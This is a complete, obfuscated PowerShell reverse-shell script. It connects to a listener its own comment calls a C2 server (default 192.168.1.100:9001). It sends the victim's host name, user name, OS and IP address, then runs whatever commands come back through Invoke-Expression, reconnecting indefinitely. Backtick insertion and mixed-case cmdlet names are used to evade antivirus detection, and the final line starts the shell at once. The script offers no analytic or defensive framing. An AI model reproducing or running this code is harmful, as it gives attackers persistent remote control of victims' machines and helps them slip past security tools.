function Start-ReverseShell {
    param (
        [stri`ng]$IP`Address = "192.168.1.100",
        [int]$Port = 9001,
        [int]$RetryIntervalSec`onds = 30
    )

    while ($true) {
        try {
            $client = $null
            $stream = $null
            $networkStream = $nul`l
            $reader = $null
            $writer = $n`ull
            
            # Try to connect to C2 ser`ver
            try {
                $client = NEw-ObJeCT System.Net.Soc`kets.TCPClient($IPAddress, $Port)
                $stream = $client.GetStream()
                $networkStream = $client.GetStream()
                $reader = NEw-ObJeCT System.IO.StreamReader($networkStream)
                $writer = NEw-ObJeCT System.IO.Strea`mWriter($net`workStream)
                $write`r.AutoFlush = $tr`ue
                $buffer = NEw-ObJeCT System.Byte[] 1024
                $encoding = NEw-ObJeCT System.Tex`t.AsciiEncoding

                # Send s`ystem info
                $computerInfo = "Host: $env:COMPUTERNAME / Us`er: $env:USERNAME / OS: $(Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Caption) / IP: $((Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object {$_.IPAddress -ne $null}).IPAddress | Select-Object -First 1)"
                $writer.WriteLine($compu`terInfo)
                $writer.WriteLine("PS $pwd> ")
            }
            catch {
                # If connection fails, retry after interval
                Start-Sleep -Seconds $Ret`ryIntervalSeconds
                continue
            }

            # Main command execution lo`op
            whil`e (($command = $reader.ReadLine()) -ne $n`ull) {
                try {
                    if ($command.T`oLower() -eq "exit") {
                        break
                    }
                    
                    # Execute command and capture output
                    $output = iNvOKE-exPResSion $command 2>&1 | OuT-stRIng
                    $writer.WriteLine($output)
                    $writer.WriteLine("PS $pwd> ")
                }
                catch {
                    $errorMessage = $_.Exception.Mess`age | OuT-stRIng
                    $writer.Wr`iteLine($erro`rMessage)
                    $writer.WriteLine("PS $pwd> ")
                }
            }
        }
        cat`ch {
            # Connection lost or erro`r, cle`anup and ret`ry
        }
        finally {
            # Clean up resources
            if ($reader -ne $null) { $reader.Close() }
            if ($writer -ne $null) { $writer.Close() }
            if ($networkStream -ne $n`ull) { $networkStream.C`lose() }
            if ($client -ne $n`ull) { $c`lient.C`lose() }
            
            # Wa`it before retrying
            Start-Sleep -Seconds $RetryIntervalSeconds
        }
    }
}

# Start the reverse shel`l with d`efault parameters
Start-ReverseShell
